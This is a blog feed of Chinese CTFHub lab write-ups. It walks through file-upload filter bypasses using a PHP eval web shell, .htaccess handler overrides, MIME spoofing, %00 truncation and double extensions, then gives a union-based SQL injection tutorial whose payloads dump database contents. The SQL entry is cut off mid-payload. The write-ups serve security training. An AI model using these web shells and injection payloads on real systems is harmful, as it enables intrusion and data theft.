    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（三）</p> <a id="more"></a><h2 id="0x00-无验证"><a href="#0x00-无验证" class="headerlink" title="0x00 无验证"></a>0x00 无验证</h2><p><img src="https://img-blog.csdnimg.cn/2020111821051990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>上传文件相对路径<code>upload/1.php</code><br><img src="https://img-blog.csdnimg.cn/20201118210615644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用蚁剑连接，连接密码为<code>pass</code><br><img src="https://img-blog.csdnimg.cn/20201118210744773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看目录，flag就在这里<br><img src="https://img-blog.csdnimg.cn/20201118210930972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x01-前端验证"><a href="#0x01-前端验证" class="headerlink" title="0x01 前端验证"></a>0x01 前端验证</h2><p><img src="https://img-blog.csdnimg.cn/20201118211350400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，结果提示该文件不允许上传<br><img src="https://img-blog.csdnimg.cn/2020111821132240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>题目是前端验证，直接查看网页源代码，发现只能上传<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种格式的文件<br><img src="https://img-blog.csdnimg.cn/20201118211703499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>把1.php改为1.jpg，然后上传抓包</p><p><img src="https://img-blog.csdnimg.cn/20201118212718468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.jpg再改为1.php，然后放包<br><img src="https://img-blog.csdnimg.cn/20201118213046598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到相对路径upload/1.php<br><img src="https://img-blog.csdnimg.cn/2020111821314576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还是一样的操作，蚁剑连接，查找目录，找到flag<br><img src="https://img-blog.csdnimg.cn/20201118213340365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x03-htaccess"><a href="#0x03-htaccess" class="headerlink" title="0x03 .htaccess"></a>0x03 .htaccess</h2><p>题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>访问<br><img src="https://img-blog.csdnimg.cn/2020111822095844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码，发现文件后缀都被禁用了<br><img src="https://img-blog.csdnimg.cn/2020111822110957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度一下hatccess文件，<code>.htaccess</code>是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</p><p><code>.hatccess</code>文件有两种写法</p><p><strong>第一种方法:</strong><br>下面代码的意思是，只要文件名中包含pass，就会被Apache解析为php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch <span class="hljs-string">&quot;pass&quot;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>提示文件名不能为空，命名为<code>3.hatccess</code>,用bp抓包，将3.htaccess改为<code>.htaccass</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/2020111912484428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><code>.htaccass</code>文件上传成功<br><img src="https://img-blog.csdnimg.cn/20201119124911563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>把上面用到的1.php改为3.pass文件，上传文件相对路径<code>upload/3.pass</code><br><img src="https://img-blog.csdnimg.cn/20201119125620833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，可以看到上传的文件<br><img src="https://img-blog.csdnimg.cn/20201119125123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查找flag<br><img src="https://img-blog.csdnimg.cn/20201119125141517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>第二种方法：</strong>·</p><p>内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>就成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.jpg</code>的文件被Apache当做php文件</p><p>上传test.htaccess</p><p><img src="https://img-blog.csdnimg.cn/2020111920274848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传成功<br><img src="https://img-blog.csdnimg.cn/20201119202825440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再上传<code>3.jpg</code>，内容为<code>&lt;?php  @eval($_POST[&quot;pass&quot;]);?&gt;</code> ，获取到上传文件路径<br><img src="https://img-blog.csdnimg.cn/20201119202922137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，连接成功。<br><img src="https://img-blog.csdnimg.cn/20201119203023188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>参考文章</strong>:<a href="https://blog.csdn.net/wn314/article/details/77074477">文件解析漏洞</a></p><h2 id="0x04-MIME绕过"><a href="#0x04-MIME绕过" class="headerlink" title="0x04 MIME绕过"></a>0x04 MIME绕过</h2><p><img src="https://img-blog.csdnimg.cn/20201120222519718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接上传4.php，提示文件类型不正确<br><img src="https://img-blog.csdnimg.cn/20201120223830616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>来使用MIME绕过，百度了解一下<strong>MIME</strong></p><blockquote><p>  MIME(Multipurpose Internet MailExtensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><p><code>MIME</code>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#text表明文件是普通文本</span><br>text/plain<br>text/html<br><span class="hljs-comment">#image表明是某种图像或者动态图(gif)</span><br>image/jpeg<br>image/png<br><span class="hljs-comment">#audio表明是某种音频文件</span><br>audio/mpeg<br>audio/ogg<br>audio<span class="hljs-comment">/*</span><br><span class="hljs-comment">#video表明是某种视频文件</span><br><span class="hljs-comment">video/mp4</span><br><span class="hljs-comment">#application表明是某种二进制数据</span><br><span class="hljs-comment">application/*</span><br><span class="hljs-comment">application/json</span><br><span class="hljs-comment">application/javascript</span><br><span class="hljs-comment">application/ecmascript</span><br><span class="hljs-comment">application/octet-stream</span><br></code></pre></td></tr></table></figure><p>上传<code>4.php</code>，使用bp抓包，修改Content-Typed的值，改成<code>Content-Type: image/jpeg</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/20201120222615911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到文件相对路径<br><img src="https://img-blog.csdnimg.cn/20201120222706592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，查找目录文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201120222949700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考文章: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型</a></p><h2 id="0x05-文件头检查"><a href="#0x05-文件头检查" class="headerlink" title="0x05 文件头检查"></a>0x05 文件头检查</h2><p><img src="https://img-blog.csdnimg.cn/20201122155831873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马5.php，提示文件类型不正确</p><p><img src="https://img-blog.csdnimg.cn/20201122155907113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 再把5.php修改成5.jpg上传，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160052550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试<strong>MME绕过</strong>，上传<code>5.php</code>，抓包，修改Content-Typed的值，然后放包，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160839518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>应该是对文件内容进行了检测，来制作一个图片码<code>m.php</code><br><img src="https://img-blog.csdnimg.cn/20201122162645668.png#pic_center" alt="在这里插入图片描述"><br>抓包修改Content-Type的值，放包<br><img src="https://img-blog.csdnimg.cn/2020112216332349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>结果提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122193529247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>看了大师傅的wp，说尽量换小一点的图片，就会成功，这次换了一个非常小的图片，重新制作图片马<br><img src="https://img-blog.csdnimg.cn/2020112219263730.png#pic_center" alt="在这里插入图片描述"></p><p>上传flag.php，抓包修改Content-Type的值为<code>image/png</code><br><img src="https://img-blog.csdnimg.cn/20201122192734886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到上传路径<br><img src="https://img-blog.csdnimg.cn/2020112219282666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，拿到flag<br><img src="https://img-blog.csdnimg.cn/20201122192926706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x06-00截断"><a href="#0x06-00截断" class="headerlink" title="0x06 00截断"></a>0x06 00截断</h2><p>了解一下00截断，<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">关于上传中的00截断分析</a><br><img src="https://img-blog.csdnimg.cn/20201122170816232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，提示文件类型不匹配, 但在url栏出现了路径信息<br><img src="https://img-blog.csdnimg.cn/20201122165152579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码<br><img src="https://img-blog.csdnimg.cn/20201122165304568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传shell.jpg，抓包<br><img src="https://img-blog.csdnimg.cn/20201122165938867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造00截断，添加<code>shell.php%00</code>，放包<br><img src="https://img-blog.csdnimg.cn/2020112217004529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功路径为<code>upload/shell.php</code>，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/2020112217043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2020112217050469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x07-双写后缀"><a href="#0x07-双写后缀" class="headerlink" title="0x07 双写后缀"></a>0x07 双写后缀</h2><p><img src="https://img-blog.csdnimg.cn/20201122171341824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马shell.php，虽然上传成功，但后缀却消失了<br><img src="https://img-blog.csdnimg.cn/20201122171256124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>，变量<code>blacklist</code>里面的值会被替换，后缀被过滤了<br><img src="https://img-blog.csdnimg.cn/20201122171458940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>继续上传<code>shell.php</code>，然后抓包修改成<code>shell.pphphp</code>，中间的php字符串被过滤，剩下的<code>p</code>和<code>hp</code>就组合成了<code>php</code>。</p><p><img src="https://img-blog.csdnimg.cn/2020112217203470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文件上传成功，得到文件上传路径<br><img src="https://img-blog.csdnimg.cn/2020112217205079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接,flag就在这<br><img src="https://img-blog.csdnimg.cn/20201122172156217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以通过上传一些平时不怎么用的容易被人忽视的文件扩展名，来绕过这种类型的验证。</p><p><strong>黑名单绕过</strong><br>通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6</p><p><strong>白名单绕过</strong><br>通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。</p><p><strong>扩展名大小写来绕过</strong><br>例如：pHp，Php，phP。</p><p><strong>双写后缀绕过</strong><br>例如：pphphp</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-sql注入练习</title>
    <link href="/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（二）</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sql注入用到的一些相关函数<br>| 函数                        | 描述                                                         |<br>| ————————— | ———————————————————— |<br>| table_schema                | 数据库名                                                     |<br>| table_name                  | 表名                                                         |<br>| column_name                 | 列名                                                         |<br>| information_schema.schemata | 包含所有数据库的名                                           |<br>| information_schema.tables   | 包含所有库的表名                                             |<br>| information_schema.columns  | 包含所有表的字段                                             |<br>| group_concat()函数功能      | 将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 |</p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>输入1<br><img src="https://img-blog.csdnimg.cn/20201114180314872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;        报错</span><br><span class="hljs-string">1 and 1=1 返回正确</span><br><span class="hljs-string">1 and 1=2 返回错误</span><br></code></pre></td></tr></table></figure><p>如果满足以上三条，则可以判断该URL存在数字型注入。</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>    回显正常<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>    回显正常<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>    返回错误<br></code></pre></td></tr></table></figure><p>所以字段数为2</p><p>3 .联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>    回显正常<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>           回显正常<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>         返回错误<br></code></pre></td></tr></table></figure><p>回显点位是1和2</p><p>4.爆数据库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli</p><p>5.爆表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表，一个是news，另外一个是flag</p><p>6.爆字段名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为flag</p><p>7.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload1: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(flag) <span class="hljs-keyword">from</span> flag<br>Payload2: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入1，发现sql语句数字中我们输入的1被单引号包裹，字符型注入跟数字型注入的区别就在于引号的闭合<br><img src="https://img-blog.csdnimg.cn/20201114185956833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; 返回错误</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 